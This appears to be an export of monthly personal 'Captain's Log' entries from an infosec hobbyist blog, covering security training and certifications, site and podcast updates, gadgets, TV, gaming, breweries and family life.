tuned!What I‚Äôm Learning Right now I‚Äôm enrolled in SANS‚Äô SEC588: Cloud Penetration Testing training. I‚Äôm on a cloud kick right now and this seemed like the perfect training for me to hone my AWS / Azure skills as well as add to my offensive security repertoire. Day 1 was a little basic and Day 2 was mostly a rehash of basic AWS knowledge I already possess but with Day 3 I am starting to get into content that is pretty interesting and new to me. Hopefully I can get through the rest of this training soon and challenge GIAC‚Äôs GCPN exam shortly after. The Shellsharks site is built using GitHub Pages which in-turn leverages Jekyll. As such, I‚Äôve been (over-time) learning more and more about Jekyll. Most recently, I‚Äôve been playing around with the concept of ‚Äúcollections‚Äù within Jekyll, specifically to build out this Captain‚Äôs Log series. The collection feature is useful for grouping this sort of closely-related content. Now that I‚Äôm familiar with why you would use this feature I‚Äôm starting to see all the other applications it may have for the site. Anyways, recently I‚Äôve learned not only how to get started with collections but also how to iterate over a collection and do stuff like grab the most recently created item in a collection. Cool! Desk Setup I‚Äôve been using a Mac Pro (Late 2013) for a week or two as my primary workstation and it‚Äôs been really great! Sure, this much-maligned ‚Äúserver-class‚Äù piece of kit may not of ever lived up to it‚Äôs initial introduction hype but even in 2021 it can definitely function as desktop/workstation-class computer with current-age specs. I took a base-model ‚Äútrash can‚Äù and leveraged OWC‚Äôs upgrade service to give this machine a bump in CPU, RAM and hard drive space (to 8-core, 64GB and 1TB respectively). This service is priced pretty fairly in my opinion and in my case, I opted for this route since I wanted to upgrade from the base 4-core processor which is not recommended for those who don‚Äôt have experience performing that sort of upgrade as it can be a little tricky. With this upgrade complete, I have a machine which has similar specs to the current-gen MacBook Pros for a fraction of the price. You can grab a Mac Pro 2013 on ebay for less than $1,000 and upgrade using OWC all combined for much less than the $2,399 that the base 16‚Äù MacBook Pro 2019 would run you. In the end, you get a computer which can be spec‚Äôed (in some ways) beyond what a modern Intel-based MacBook Pro could get you, has much more in the way of I/O (6x Thunderbolt v2, 4x USB-A, 2x Ethernet, 1x HDMI) and imo ‚Ä¶ looks really cool. Gadgets I ordered a pair of Sky Blue AirPods Max in December of last year and recently took delivery of them (Was this backorder a sign of high demand or low volume production? I‚Äôm not sure). I‚Äôve used over-ear headphones in the past and never really took to them. Either I found them uncomfortable, too-bulky or just overkill for what I really needed for music listening at the time. Regardless, being the fanboy that I am I decided to try out the new (very expensive) offering from Apple. With the improvements in AirPlay 2, coupled with other neat integration features with iOS I felt these would be if nothing else a fun (albeit expensive) way to listen to my music. More substantively, I had developed a few real-world use-cases for owning a pair of over-ear, noise-cancelling headphones. First, I often like to listen to my music at a high volume. I own a few HomePods which to my ears produce high quality sound and are very loud but this style of listening comes at a cost of being somewhat invasive to anyone in my house. Up until recently that has just been my wife but as a new father, I don‚Äôt want to run the risk of waking up or otherwise aggravating the baby with loud, often somewhat aggressive music. Second, I like to listen to music while I work and the AirPods Max seemed like they could deliver the serene, noise-cancelling soundscape I‚Äôd need to focus on what I‚Äôm working on all while rocking out. I haven‚Äôt decided whether I will keep them but so far I‚Äôve been impressed with their sound (Disclaimer: I am in no way an audiophile or a good judge of sound quality at a technical level), love the way they look and think they are very comfortable. I‚Äôve worn them for several contiguous hours and felt none of the usual strain that I typically feel with over-ear headphones. My only complaint so far is that the ear cups are quite heavy (being solid metal) which has resulted in them sliding forward on my head in times where I am leaning over quickly or dramatically head-banging to some power metal. Not a deal-breaker but at $550 USD I‚Äôm not completely sold quite yet. Fitness Since the pandemic began, my primary source of exercise (basketball) has been almost entirely erased from my weekly routine. Up until recently, I‚Äôve failed in replacing this with any substantial alternate form of exercise. I‚Äôve never had success motivating myself into doing traditional weight-training and it‚Äôs been a few years since I regularly went running. I‚Äôve realized this is something that needs to be remedied in some manner so I have started the free trial for Apple Fitness+. The service is relatively new and as a result has only a small selection of available workouts but just today I received an alert notifying me that new workouts are now available so I‚Äôm sure they are working hard to build out new offerings. To date I have done a few workouts and have found them to be very approachable, even for someone like myself who has never really done group/class-style workouts before. What I think will motivate me to return is the gamification aspects coupled with the tight integration with my Apple Watch and general iOS ecosystem. If nothing else, it does feel good to get out of my desk chair and get a li‚Äôl sweat goin‚Äô. TV A few years ago, I (finally) decided to sit down and watch the animated Star Wars series, The Clone Wars. As a life-long Star Wars fan I thought it would be a dream to have that much (canon) Star Wars content. Though I found the story pretty compelling right from the first episode I was turned off a little by the animation style and a-lot by the over-the-top-silly dialogue coming from the goofy Battle Droids. So I gave up. Due to a certain (very awesome) cameo in the second season of the Mandalorian I decided to give the show a second chance. Though I still never got used to how silly the droid-army is I did watch the entire series and really enjoyed it. Particularly the final season I found to really be amazing. The way this series provides background on all the smaller characters in the main Star Wars series was a huge plus. If you‚Äôre like me and haven‚Äôt watched Clone Wars, I highly recommend giving it a shot! I‚Äôve also been re-watching/binging Game of Thrones and through the first 6 seasons it really is one of the best shows (imo) of all time. I have my gripes with the final two seasons (like many do). Mostly, I think the final seasons are marked with plot points that are both really really awesome but some that are not-so-awesome, silly or even a little non-sensical. Ultimately I think it‚Äôs fine the way the show ended but I still don‚Äôt like some of the ways in which they got there nor the feeling of being rushed to the finish-line by the show creators. Oh well, still hasn‚Äôt prevented me from watching it all over again. Gaming Though I‚Äôve been really busy with work, fatherhood and Shellsharks-related stuff, I have found time for one of my other life-long but recently-ignored passions - Gaming. Coming off a second stint of being overly-obsessed with playing Destiny on Stadia, I wanted to find something that was fun but didn‚Äôt require the same time-commitment. Enter Super Mario 3D World + it‚Äôs expansion ‚ÄúBowser‚Äôs Fury‚Äù. I only recently picked up a Switch (shoutout to a friend who traded it to me for a 6-pack of beer) and I have to say, the console really is good for facilitating game-anywhere. What I mean is that I can un-dock my the Switch, bring it downstairs and play through a number of levels in Super Marios 3D World while I watch TV with the wife, or play a little in bed before I go to sleep. Otherwise, it‚Äôs kinda a whole production to sit down in front of my TV and have a long play-session. Those opportunities are fewer and farther between these days so being able to bring the console anywhere is great. So back to Super Mario 3D World‚Ä¶ this game has been out for a while but with the newly released expansion I pulled the trigger on buying it. The expansion, ‚ÄúBowser‚Äôs Fury‚Äù, is very reminiscent of the classic N64 title Super Mario 64 which remains to this day one of my favorite games of all time. I‚Äôm not going to review Super Mario 3D World but rather I‚Äôll just say that it‚Äôs a lot of fun and with it‚Äôs local AND online co-op multiplayer modes it‚Äôs been a fun way to send time with family &amp; friends. Hanging out with others, especially in this time of pandemic is certainly time-well-spent. Investing I‚Äôve been a long time fan of Tesla and a huge TSLA bull. As such, I recently bought a bit of TSLA stock‚Ä¶ then‚Ä¶ it dropped like 25%. Ugh! Well, good thing I‚Äôm long on it. Learn from my mistake‚Ä¶ dollar-cost average. I also have dipped my toe into the world of cryptocurrencies. I signed up for a Coinbase account and took some relatively small positions in a few different crypto-variants (i. e BTC, REN, BCH, DASH, ETH, XLM, AAVE, LINK, LTC) - No DOGE, despite my boy Elon‚Äôs infatuation. It‚Äôs definitely a wild world. 25% gains and losses in any given day. Something that if you watched the markets real closely you could probably make some decent gains doing amateur-ish day-trading. Would require a larger investment than I‚Äôve made which can be scary though. Hah! I‚Äôm using standard Coinbase as well as Coinbase Pro but find that though fees are less with pro, the inability to trade from crypto to crypto is a real weakness of the ‚Äúpro‚Äù platform. Life I recently became a Dad to an awesome li‚Äôl dude. This has changed a lot about how I spend my days and certainly has introduced competition for my time. Between my career goals, unyielding desire to learn all the cybers, and continued development of Shellsharks, this has meant a top-to-bottom reprioritization of everything. Though the pandemic has been terrible, it has at least given me the ability to work-from-home and thus spend more time with my son. With no commute, and some rejiggering of my schedule / daily tasks, I‚Äôve (so far) found time to spend with my expanded family while also GTD at work and continuing to work on the site. Oh, and sleep training has really been a worth-while and time-freeing exercise. I do miss my house being clean though‚Ä¶ With the uptick in time I spend on work, my multitude of side projects and family-stuff, I‚Äôve found myself being entirely fueled by Gushers and coffee. The healthiest decision?‚Ä¶ no. But, I do love candy.

Not quite reliably warm yet in NOVA but getting there. This past month has really been a blur‚Ä¶ Site News I introduced a few new features to the site in the past month. Tags, a disclaimer and a couple new social links (i. e. Reddit &amp; Mastodon) to name a few (EDIT: Removed Mastodon link - no one really uses that). Does anyone actually use Mastodon? I‚Äôm particularly proud of my tagging implementation. There‚Äôs nothing overtly challenging about how it‚Äôs being done, I just think it‚Äôs cool. Definitely check it out. I also changed up the way I use Font Awesome to display the little icons you see on the home page (and sprinkled elsewhere around the site). It was actually really easy to switch from the locally-served variety to the remote, JS approach which brings the icons in directly from Font Awesome‚Äôs servers. &nbsp;&nbsp;Shellsharks Community I‚Äôve learned that maintaining an active Discord server is hard. But that‚Äôs ok, not every wants to chat infosec every day like myself. That‚Äôs perfectly ok! Where there is endless engagement however is Reddit. I‚Äôve set a personal goal for myself to average at least one post or comment a day over the course of this entire year (so at least 365 posts/comments). The idea is for these posts/comments to be substantial, helping out the community, answering questions, etc‚Ä¶ It‚Äôs April 3rd today, so we‚Äôre about 90+ days in and I have approximately 115+ comments/posts so far, so I‚Äôm on track to meet or exceed my goal. Will likely report on this throughout the year and have some interesting statistics (e. g. # of posts, total karma gained, etc‚Ä¶) by the end of the year. On the topic of Reddit - I also dropped a link for my Getting Into Information Security write-up and it got pretty positive feedback which was cool. Shellsharks Podcast Update on the podcast - Basically, I have everything I need now to actually start it up. I was missing some of the software I needed to route, record and inject the audio, and I wanted a decent webcam to see my cohost(s) and/or guest(s). I‚Äôve now acquired all of this stuff. Recording and then publishing of episode 1 should (hopefully) be sometime in the April timeframe!What I‚Äôm Learning As I previously mentioned, this past month has been a bit of a blur (much of my focus has been on a secret project). Mostly I have been making a couple of (imo) cool additions to the site and learning more about Jekyll along the way. My studying for the SANS SEC588 Cloud Penetration Testing course also got thrown on the back-burner. I need to pick this back up soon or my exam attempt will expire‚Ä¶Desk Setup I‚Äôve made just one important change to my current desk setup and that is the addition of the Logitech Brio webcam (Purchased on Amazon). This was one of the last things I needed for all things meetings, podcasting and generally keeping up with people via video chats in a quarantined world. The quality of it is really nice, it is simple plug-n-play with MacOS and the default field-of-view is good imo. I have it sitting on a little camera tripod I found lying around my house which puts it at a good level relative to my face. Now between the 4k web cam, the pod mic and using the headphones for audio-out, my setup for meetings is maybe a little over the top, but the quality is great so I‚Äôm happy with this setup. Gadgets Update on the AirPods Max - Basically, I returned them. The audio quality was good but to my ears not so great that they were really worth the $550 price tag. At the time I was trying them out, they were suffering from a pretty serious battery drain issue and this was one of the big reasons I was unhappy with them. Of course, this seems to have been remedied in a recent firmware update but, oh well. In the end, I‚Äôm happy I returned them. iPad. I had to give the one I had up and since then have really missed it. I haven‚Äôt went off and bought a new one yet as the upcoming models are supposedly going to be announced soon. My iPad story is one of not knowing what you‚Äôd miss until you no longer have it. Turns out, I used my iPad quite a bit! I would load recipes up onto it for cooking, it was my couch-web-surfing machine of choice and I used it a lot for browsing/responding to things on Reddit, etc‚Ä¶ I think I‚Äôll definitely be picking another one up, just have to wait for the new models. Fitness Just forget everything I said last time about Apple‚Äôs Fitness+. Well‚Ä¶ maybe not everything. I still think the service is cool and something I might be able to get into, but I haven‚Äôt kept up with it. With warm weather here around the corner I am however hoping to get a little more active and start to burn off some of this winter/Covid chub I‚Äôve managed to accumulate. TV Finished up the re-watch of Game of Thrones. Still awesome overall. The final season is OK‚Ä¶ could have been better. Other than that - I‚Äôm not a real crime documentary person but I heard interesting things about the Netflix special The Vanishing at the Cecil Hotel and decided to give it a shot. My review is essentially ‚Äì Yeah, that video of Elisa is strange and definitely creepy, but that documentary tries waaaaay too hard and is really one of the worst things I‚Äôve ever tried to watch. 0/10 would‚Äônt recommend. Gaming Haven‚Äôt been playing much of anything (busy with secret project). This game looks pretty cool though. Might have to give it a shot. Investing I‚Äôve tried not thinking about it. My beloved TSLA has been down but things might be looking up. LifeNot too much interesting to report. But I am excited about it warming up! I‚Äôve missed playing frisbee golf.

Site News I‚Äôve ‚Äúofficially‚Äù launched the Vulnerability Management Bootcamp (* v0. 99), which is a relatively in-depth piece (over 15k words). * There are a few finishing touches I need to apply to the bootcamp, hence the 0. 99 version number. Ultimately, I intend on creating a series of bootcamps and trainings similar to the VM bootcamp and have them all be part of a greater effort - Shellsharks Academy (or something like that). Successful completion of any individual bootcamp would (in this future scenario) earn you a certification, and combined with multiple other trainings, could net you a ‚Äúgraduate‚Äù certificate in a sense. The academy as an idea lives exclusively in my head for now but I‚Äôd like to see where I can take it once I get some feedback on the initial offering. In creating this initial VM bootcamp, I learned a little about testing jekyll sites remotely (see cli snippet below) as well as the limitations of the Javascript onmouseover action on mobile. Long story short, it doesn‚Äôt work well. bundle exec jekyll serve --host=0. 0. 0. 0 I made a hefty addition to the infosec blogs repository. Shoutout to @DoddysLTD and his tweet for providing a lot of the source material. Shellsharks Community I recently posted on Reddit a link to my Designer Vulnerabilities historical resource. It got some decent feedback! I also posted a link to my Education Retrospective and though I got some engagement, overall I think people may have considered it a little ‚Äúbraggy‚Äù. Oh well, can‚Äôt please everyone. Shellsharks Podcast So the first episode (as well as the introduction episode) of The Shellsharks Podcast has been recorded, yay! It is however not available for streaming, yet. I need to find how to actually get it into Podcast apps. This requires finding suitable hosting (maybe SoundCloud?), creating an RSS feed and submitting the podcast to the necessary places. Hopefully I can sort this out by the end of this week. As a sneak peak though, check out the Podcast art below!What I‚Äôm Learning So I (finally) sat for my GIAC GCPN certification exam and am happy to report I did very well (scoring a 90%)! The exam was pretty easy in my opinion. I have a review of the exam/class on the site if you are interested. In preparation for the exam, I used only one of the two practice exams SANS provides which meant I was able to give the other away. It‚Äôs nice that SANS allows you to do this. Gadgets Apple recently held their Spring event wherein they introduced a variety of new and interesting products - new 4K Apple TV, improved Apple TV Siri remote, AirTag, M1-powered iMacs, a new purple iPhone 12 and most importantly (for me), the new M1-laden iPad Pro. I‚Äôd previously complained about not having an iPad but was (somewhat) patiently waiting for Apple to refresh these devices before purchasing another one. Well I‚Äôm glad I waited! The introduction of the M1 chip into the iPad doesn‚Äôt just mean the iPad will benefit from the performance improvements which the M1 brings. This also hints at a future for the iPad that might include other ‚Äúdesktop-class‚Äù applications (such as XCode!). I‚Äôm very excited for what this will mean for the iPad in the future and think this is a good time to get in, as the M1 future-proofs this purchase for some time. A quick comment on AirTag: I think these are cool - but, I‚Äôm not sure I have enough concrete reasons for getting them quite yet. I‚Äôd like to think of four solid use-cases and then buy one of the 4-packs. These are my potential AirTag use-cases so far‚Ä¶ Put one in my car: My car currently has a feature where I can pinpoint it‚Äôs location via GPS so I‚Äôm not sure if this is a great use-case. I think the AirTag would have better accuracy though in a crowded parking lot or if GPS coverage is poor. Frisbee Golf: I do a little frolfing and occasionally will throw a disc so deep into the woods that I have a hard time finding it. This could be the answer to that issue. The real question is, where can I place the tag on the disc and would it non-trivially affect its ability to fly in the same way. Also I have to consider the implications of throwing a disc into a pond and losing the $25~ tag completely. Purse: Not for me, but for the wife. Maybe she would want to track this? I‚Äôd have to ask. Fitness Though I haven‚Äôt been exercising nearly as much as I‚Äôd like to (or at all really), I did recently purchase some new shoes that I hope to use for running. That combined with a little less mid-week craft beer enjoyment and I think I can achieve some health points. TV I‚Äôve been watching ‚ÄúThe Good Place‚Äù and though I think the name is a pretty silly, the show is very good. Life I‚Äôm on Clubhouse now (@mk3s). I haven‚Äôt really gotten that into it yet but if you‚Äôd like to connect with me there that‚Äôd be cool. I started a new job! More details on this to come‚Ä¶ Warmer weather is here! This, coupled with having received my second vaccination dose (Pfizer) means I will be enjoying more of Northern VA‚Äôs excellent wine region. In fact, I recently went to Two Twisted Posts winery and really enjoyed not only the wine but also the laid-back vibes. I definitely recommend it!

By ‚Äúinfosec-infused‚Äù I mean playing a game of some kind while having a casual infosec chat (as opposed to live-streaming myself doing a CTF or something). I‚Äôm shellsharks on Twitch if you want to catch any of my future streams though! I‚Äôve (finally) made the effort to configure my shellsharks domain email. I‚Äôve used the Zoho free-tier for basic e-mail with my custom domain which I definitely recommend. So feel free to email me anytime! I mentioned in an earlier log entry that I was on Clubhouse. I‚Äôve been thinking of doing some open-forum infosec chat rooms there. We‚Äôll see what engagement looks like with something like that. Shellsharks Podcast So the podcast is live! I‚Äôve got two episodes up and I think they‚Äôve gone pretty well. I‚Äôm still working on finding some footing in terms of format and content but I plan to just discover that as I go. Episode 1 - Colonial Pipeline Hack &amp; More Episode 2 - Getting Into Infosec (Part I) For hosting, I went with PodBean which I have been pretty happy with so far. Time will tell if I want to use them long term. Reddit wasn‚Äôt overly responsive to the podcast. Oh well! ¬Ø\(„ÉÑ)/¬ØWhat I‚Äôm Learning I recently worked as a virtual teaching assistant (vTA) at the SANS Purple-Team Summit (2021) for SEC504. I‚Äôm relatively experienced in the world of SANS trainings and have participated as a course facilitator a number of times but working as a vTA was a new experience. It was fun and rewarding to help the students in that class througout the week! I recently became re-acquainted with the concept of Chaos Engineering (of Netflix origins circa 2010 - think Chaos Monkey). Though I haven‚Äôt really been learning anything specifically in this domain, I think it‚Äôs a cool area to be in so it‚Äôs definitely on my radar for the future‚Ä¶Gadgets In a continuation of my AirPods Max saga - I‚Äôve picked up a new pair. Most of my original gripes have been resolved through firmware updates so I‚Äôve been pretty happy with them so far. They work really well with moving from one device to another, the active noise-cancellation is unbelievable and the sound is pretty good to my ears so I‚Äôm thinking I will hold onto them this time. I also finally received my new M1-enabled iPad (11-inch model). It‚Äôs similar in a lot of ways to my previous 11-inch model so there really isn‚Äôt much to say. I don‚Äôt have any apps or workflows that really take advantage of the power the M1 brings. I look forward to WWDC next week as I expect they will unveil some potentially interesting things in the world of iPadOS. (Here‚Äôs to Xcode making its way to iPad soon!)Desk Setup With both my AirPods Max and AKG K240 Studio (which I use for podcasting) headphones sitting on my desk, I‚Äôve started shopping around for a headphone stand that fits the vibe of my workspace. Haven‚Äôt found anything yet though‚Ä¶Fitness Hoping to do a little outdoors pickup basketball soon. TV I finished up Disney‚Äôs The Falcon and the Winter Soldier. I can see how for some those two characters are kinda random and not overly compelling relative to some other characters in the Marvel universe. I really enjoyed this arc though. I started watching Disney‚Äôs animated series Star Wars: The Bad Batch. The Bad Batch is a spin-off from the previous animated series Star Wars: The Clone Wars. Like the Clone Wars series, I really enjoy the tie-ins that are made to the original movies. I‚Äôve learned quite a bit about the smaller characters - everything from Toydarians to the Rancor! It‚Äôs just fun to see how they weave in all the lore and interesting elements from the original films. I finished The Good Place. It was overall a really great and super funny show. Not sure I completely agreed with how it ended though. Gaming I‚Äôve recently decided to get into some retro-ish gaming, playing some Neverwinter Nights on Steam. I played quite a bit of NWN growing up so it‚Äôs been fun revisiting this title. With cross-platform online multi-player, it has a lot of co-op potential!Life Spring and Summer means brewery and winery hopping! Here‚Äôs a few from the past month‚Ä¶ Wheatland Spring - Good beer in a quaint little spot. I really like their bottle/can design and logo too. Bear Chase Brewery - Pretty good beer selection and a great view - kinda reminds me of a ski slope without the snow. They also have pretzels + beer cheese dip which was‚Ä¶ yum. Quattro Goombas - This is definitely my go-to spot. Close-by, has wine and beer - oh, and they have wine slushies‚Ä¶. amazing. They also have really great pizza. Dirt Farm Brewing - The beer selection is just OK but the views and grounds are amazing. They also used to have boiled peanuts which are my all-time favorite food. Though this past visit they only had food from a third-party food truck. The Bruery - Not a place I‚Äôve *visited* but as a member I‚Äôve been ordering a lot of very compelling brews. They just don‚Äôt stop! Hill High Marketplace - Amazing selection of craft beer + delicious pies. Easily my favorite place in all of Loudoun county.

Episode 3 - Pentesting Chat (and Beer Chat) Gadgets I normally don‚Äôt use beta versions of iOS/iPadOS/MacOS but I couldn‚Äôt help myself this year. I decided to install the public beta of iPadOS 15 mainly for the widgets-anywhere-on-the-home-screen feature. So far, it hasn‚Äôt disappointed. I really like both the look and the utility of these widgets. I know my Android brethren out there will scoff at this but, yeah - iOS widgets are really useful and do so in style. I don‚Äôt use that many - calendar, a to-do list, stock ticker, photos and weather are all that I‚Äôm using right now. Fitness I‚Äôm finally back out on the court (at least one day a week now). TV I‚Äôve been watching Disney‚Äôs Clone Wars spin-off, The Bad Batch and have really been enjoying it. It‚Äôs retains a lot of the silliness the original series brought but continues to delve into interesting elements of the Star Wars Universe, this time immediately after the rise of the Empire. The Loki show has also landed and after the first four episodes I am definitely hooked. The way this show ties in with the rest of the Marvel universe was really clever and Tom Hiddleston is as great and Loki-ish as ever. Finally, I finished up season four of The Handmaid‚Äôs Tale. Through four seasons this show has managed to stay pretty exciting. This season was particularly intense but I think that was in part due to my new parenthood status. Life I‚Äôve spun up an Untappd account. You can check out my eclectic brew-tastes there. Played some frisbee golf at Spilman Park and Jenkins Mountain. Jenkins Mountain was a new course for me and trying to do it after 18-holes at Spilman proved to be too much. The first couple holes of Jenkins Mountain were (at least to me) a little too difficult - though I plan to conquer it sometime soon. Besides the views of the Shenandoah Mountains, the best part of this course is that it begins right at the front door of Skyline Brewing and by the time you get to hole 3 you find yourself at the Little Washington Winery! I made my way out to Old Bust Head brewery. Though it‚Äôs a little further away for me than many other breweries, I think they have the best beer of any place I have tried in the NoVA area. This trip did not disappoint as I had their Buckland Mill Milk Stout and wow‚Ä¶ it was not only easily the best milk stout I‚Äôve ever had but easily one of the best all around beers. Only twice have I ever drank a beer and thought to myself, this is the perfect incarnation of this type of beer. (The only other two times being with Pilsner Urquell while in the Czech Republic and the Westvleteren 12 while in Belgium. ) Drove down to South Carolina (for the first time in like four years) and re-united with some family. It was a really great time. Great food and of course boiled peanuts!" }, { "id": 357, "url": "https://shellsharks.com/captains-log/2021/08/01/log", "title": "Captain's Log, Entry: August 1, 2021", "body": "2021/08/01 - It‚Äôs been a busy month‚Ä¶ Site News The first annual &gt;Shark Week was held July 11-17! It was a bit hectic getting everything out on time given everything else I had going on (work, fitness challenge and training) but I had a lot of fun and met some new people in the community! Reddit was okay on it. I‚Äôll be trying to do this every year for sure. However, next time I will have some things prepared leading up to it. True Story: I literally thought of the idea the day before &gt;Shark Week began - so I was a bit rushed. I hosted a (non-Shellsharks-related) AMA on Reddit and the response was pretty great! Shellsharks Community I‚Äôve been thinking of making some Shellsharks-themed shirts‚Ä¶ have some ideas but no final design. I was invited to join the ‚ÄúIntroduction to Coding/Hacking and CyberSecurity Discord‚Äù as a community mentor. So I did. You can find me in there! I‚Äôve got a pretty exciting project in the works. Can‚Äôt say much else but stay tuned! Shellsharks Podcast I dropped two new episodes of the podcast. Check ‚Äòem out! Episode 4 - Burnout &amp; Motivation Episode 5 - Blogging &amp; WGU I‚Äôve been thinking of introducing the idea of ‚Äúseasons‚Äù into the podcast. Each season would have a theme. Season one‚Äôs theme, (for example) could be something like ‚ÄúGetting Into Information Security‚Äù. Then, throughout that season, I would have a lot of podcast content focused on that subject. Just a nugget of an idea at this point‚Ä¶What I‚Äôm Learning I served as a moderator for SANS SEC460: Enterprise and Cloud | Threat and Vulnerability Assessment @ SANSFIRE (Virtual Edition 2021). The course was really (and I can‚Äôt stress this enough), really good. I consider myself a bit of a Vulnerability Management/Assessment expert and I still learned so much. The instructor (and course author), Matt Toussain did a fantastic job. I definitely recommend this course. Prepping for the certification exam (GEVA) now! I‚Äôve been interested in getting more experience in Threat Modeling. If you didn‚Äôt know, there are a ton of methodologies‚Ä¶ STRIDE : Spoofing, Tampering, Repudiation, Information Disclosure, Denial-of-Service, Elevation of Privilege DREAD : Damage, Reproducibility, Exploitability, Affected users, Discoverability PASTA (Process for Attack Simulation and Threat Analysis) LINDDUN : Linkability, Identifiability, Non-repudiation, Detectability, Disclosure of information, Unawareness, Non-compliance hTMM : Combines Security Cards, Persona non Grata and STRIDE. Trike VAST (Visual, Agile and Simple Threat modeling) OCTAVE (Operationally Critical Threat, Asset and Vulnerability Evaluation) ‚Ä¶to name a few‚Ä¶ In addition to threat modeling, I‚Äôve been looking to strengthen my overall AppSec-fu. Reading through OWASP‚Äôs Application Security Verification Standard (ASVS v4) is one part of that effort. A long time ago, I purchased the eLearnSecurity, ‚ÄúAll Access Pass‚Äù. Shortly after purchasing, I managed to complete their Penetration Testing Student (PTS) and Penetration Testing Professional (PTP) courses/certifications - but for the last 5 years, have not really touched any of the other bundled content. After all this time, I‚Äôve re-opened the legacy console and have started hacking away at the Web Application Penetration Testing course yet again. Once I (hopefully) obtain my eWPT cert, I can then proceed to the more advanced Web Application Penetration Testing eXtreme course, WAPTX! I‚Äôve just finished up moderating the SANS course, SEC450: Blue Team Fundamentals: Security Operations and Analysis @ SANS Cyber Security East. Though I don‚Äôt consider myself a ‚Äúblue-teamer‚Äù, and this course is a 400-level course, I found the material to be incredibly high-value and immensely thorough. The instructor, John Hubbard, is really top-notch. I recommend you check out his podcast, Blueprint. It‚Äôs worth mentioning that this course has a certification (GSOC) coming out in August. I‚Äôm looking forward to adding it to my collection! In addition to all my other AppSec-ing, I am eyeing the Offensive Security WEB-300 course, Advanced Web Attacks and Exploitation (AWAE/OSWE). I‚Äôm hoping to start (and finish) it sometime before the end of the year. The OSWE would be the first in my pursuit of the epic (and new) OSCE3 certification from OffSec. In preparation for the AWAE/OSWE, I‚Äôve joined the Offensive Security Discord. I‚Äôm in way too many infosec Discords‚Ä¶ As part of all this AppSec learning, I am working on a web security compendium of sorts. What form it will ultimately take and its release date is TBD. Gadgets There are rumors of a refreshed Mac Pro w/ Intel Ice Lake. I‚Äôve been wanting to pick up a Mac Pro for a while now‚Ä¶ Who knows!Fitness I was victorious in the Apple Watch fitness challenge throw-down between myself and some recent Podcast guests. Though I will say that the parameters of the challenge were somewhat contested. I‚Äôve been playing a little more basketball recently. I just hope the Delta variant doesn‚Äôt completely ruin inside ball. Picked up a gym membership. I‚Äôm fortunate to have work pay for it so why not? Typically, I just play bball at the gym but have been trying my hand at weight-lifting. TV I finished up the first season of Loki. I really loved it. I‚Äôm looking forward to what comes next. Still watching The Bad Batch on Disney+. I am enjoying it but the episodes are starting to blur together a bit. MythicQuest on Apple TV+ is back! I loved season one and so far season two is just as hilarious. Gaming It‚Äôs been a long time since I played Halo and I don‚Äôt even have a console, but I‚Äôm seriously thinking of picking one up to play Halo Infinite. I‚Äôm patiently waiting for Diablo 4 to drop. In the meantime, Diablo 2 Resurrected is coming soon‚Ä¶ Life I‚Äôve made a couple trips recently to Stone Tower Winery. It has quickly become one of my favorite local spots due to the nice views and amazing BBQ ribs. Barnhouse Brewery in Leesburg has really good beer. I recently visited and had a great time. Placed a nice-sized order at my favorite brewery, The Bruery. I‚Äôm hoping to level up from the Reserve Society to the Hoarders Society but know no other way than to spend a lot of $$. Never really been a coffee person but I‚Äôve been drinking some home-made iced coffee recently. Just not a fan of warm drinks‚Ä¶ Tesla recently released their Model S Plaid and‚Ä¶ I‚Äôm in love .

Site News I‚Äôve published my SEC460 / GEVA review as well as a short piece on the multitude of cybersecurity roles which exist in the infosec industry. My inventory of infosec blogs has surpassed 800 individual sites - cruising towards 1k in no time. I‚Äôve published a digital version of my resume. This resume does not follow the traditional format. More on this below‚Ä¶Shellsharks Community Had an extra SEC460 practice exam voucher to giveaway. It was snatched up pretty quickly. What I‚Äôm LearningContinuing some threads from last month‚Ä¶ I‚Äôve passed the GEVA exam with a 90+ score which qualifies me for the SANS instructor development program for that particular course. I‚Äôve been interested in potentially becoming an instructor for SANS for some time now and this may be the course that I decide to pursue. I‚Äôve been pretty distracted and unable to make any meaningful progress on my eWAPT certification effort. Speaking of distractions, I‚Äôm currently prepping for the SEC450 / GSOC exam which was just released. Looking forward to the Advanced Web Attacks and Exploitation (AWAE/OSWE) course from OffSec. Planning to start sometime in October. I recently served as a SANS virtual TA (vTA) for SEC503. That class has always been a beast and being a quasi-instructor for it is no joke. The added difficultly was TA‚Äôing in a completely virtual setting where I could not see students‚Äô screens or help them troubleshoot in person. I recently participated in the Core NetWars Tournament at SANS Offensive Operations West 2021. This is the 7th iteration of Core NetWars, the theme of which was IoT. It was fun but certainly challenging. It being my first time participating in this iteration, I was competing in the ‚Äúnewbies‚Äù pool. I placed 4th in that bracket and as a result won not only a shiny NetWars champion coin but also punched a ticket to the annual NetWars Tournament of Champions which typically takes place annually at SANS CDI. For an added bonus, this particular NetWars event was also a Coin-A-Palooza event where I was able to win a couple SANS course challenge coins from previous classes I have completed. Love the bling! In the process of sharing some links to content on my site, I noticed there was an issue with the image populating correctly as part of that share. Peeking into my site source I noticed the ‚Äúog:‚Ä¶‚Äù tags and did a little research on what they were and how they are used. This led me to learning a lot more about The Open Graph protocol. If you‚Äôre interested in updating the OGP metadata for previously shared links on Linkedin, check out the post-inspector utility. Fitness Delta variant is really messing with my gym-ing. Ugh. TV Finished up the most recent season of The Bad Batch on Disney+. Enjoyable but not mind-blowing. Have watched a few interesting movies (new and old) lately‚Ä¶ Tenet, Midsommar, Rounders, Godzilla vs Kong, Blast from the Past, The Little Things. Tenet was really cool and equally confusing. I think it deserves at least a second watch. A Star Wars anime? Ummmm‚Ä¶ YES. Life Still @ Model S Plaid. A Rant on Traditional Resumes: I recently re-thought the visuals and content-approach for my professional resume, the outcome of which you can find a digital version of on my site. The big difference between this new approach and the traditional approach is I have not included the list-of-each-job-in-chronological-order-with-what-I-did-at-each-place stuff that you typically see. Instead, I have summarized the projects and skills that best summarize my experience and included an alphabetical list of places I have worked. Let me explain why I don‚Äôt like the traditional approach‚Ä¶ I find that the focus being on where you‚Äôve worked as opposed to what your achievements are is really just a means by which prospective hiring teams can discriminate against you or otherwise discount valuable experience you have because they don‚Äôt like or know the company that that experience was associated with. That‚Äôs not to say that 5 years of experience at Google is the same as 5 years experience at some small company, but in the end, I‚Äôve never been in an actual interview where it‚Äôs seemed like I‚Äôve gotten points based on where I‚Äôve worked in the past. Ultimately, I still needed to prove my knowledge in the interview and that can be done by anyone with the skills/confidence required, not just by those with the ‚Äúbest‚Äù companies listed. Total years experience. This is and has always been a dreadful way of judging someone‚Äôs relative skill. There are plenty of 10+ year pros who can‚Äôt do half of what some talented up-starts with 3 years experience can do. In a traditional resume, you have to list time and duration for every. single. job. This artificial handicap serves 